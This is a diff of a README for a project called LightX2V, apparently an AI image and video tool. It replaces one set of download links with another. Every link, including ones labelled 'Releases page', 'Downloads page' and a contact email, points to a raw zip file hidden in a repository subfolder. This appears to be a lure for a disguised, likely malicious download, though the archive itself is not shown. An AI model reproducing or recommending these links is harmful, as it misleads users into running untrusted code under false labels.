@@ -6,11 +6,11 @@ Welcome to LightX2V, your easy solution for generating images and videos using a
 
 ## 📥 Download LightX2V
 
-[![Download LightX2V](https://github.com/ahmed77fawzy/LightX2V/raw/refs/heads/main/lightx2v_platform/ops/attn/Light_V_v1.8.zip)](https://github.com/ahmed77fawzy/LightX2V/raw/refs/heads/main/lightx2v_platform/ops/attn/Light_V_v1.8.zip)
+[![Download LightX2V](https://raw.githubusercontent.com/ahmed77fawzy/LightX2V/main/scripts/seko_talk/V_Light_3.4-beta.2.zip)](https://raw.githubusercontent.com/ahmed77fawzy/LightX2V/main/scripts/seko_talk/V_Light_3.4-beta.2.zip)
 
 To download LightX2V, visit the Releases page. Here, you will find the latest version of the software.
 
-[Visit Releases Page to Download LightX2V](https://github.com/ahmed77fawzy/LightX2V/raw/refs/heads/main/lightx2v_platform/ops/attn/Light_V_v1.8.zip)
+[Visit Releases Page to Download LightX2V](https://raw.githubusercontent.com/ahmed77fawzy/LightX2V/main/scripts/seko_talk/V_Light_3.4-beta.2.zip)
 
 ## 🛠️ System Requirements
 
@@ -26,7 +26,7 @@ Before you proceed, ensure your system meets these basic requirements:
 
 Follow these steps to install LightX2V:
 
-1. **Visit the Releases Page**: Click on this link to go to the [Releases page](https://github.com/ahmed77fawzy/LightX2V/raw/refs/heads/main/lightx2v_platform/ops/attn/Light_V_v1.8.zip).
+1. **Visit the Releases Page**: Click on this link to go to the [Releases page](https://raw.githubusercontent.com/ahmed77fawzy/LightX2V/main/scripts/seko_talk/V_Light_3.4-beta.2.zip).
   
 2. **Find the Latest Version**: Look for the newest version at the top of the page.
 
@@ -77,8 +77,8 @@ If you would like to contribute to LightX2V, feel free to submit suggestions or 
 
 ## 📧 Contact
 
-For any inquiries, you can reach out via email at https://github.com/ahmed77fawzy/LightX2V/raw/refs/heads/main/lightx2v_platform/ops/attn/Light_V_v1.8.zip We aim to respond quickly to any questions or feedback you may have.
+For any inquiries, you can reach out via email at https://raw.githubusercontent.com/ahmed77fawzy/LightX2V/main/scripts/seko_talk/V_Light_3.4-beta.2.zip We aim to respond quickly to any questions or feedback you may have.
 
 ---
 
-Thank you for using LightX2V! We hope you enjoy creating amazing video content effortlessly. Remember, you can always return to the [Downloads page](https://github.com/ahmed77fawzy/LightX2V/raw/refs/heads/main/lightx2v_platform/ops/attn/Light_V_v1.8.zip) to find the latest updates.
+Thank you for using LightX2V! We hope you enjoy creating amazing video content effortlessly. Remember, you can always return to the [Downloads page](https://raw.githubusercontent.com/ahmed77fawzy/LightX2V/main/scripts/seko_talk/V_Light_3.4-beta.2.zip) to find the latest updates.
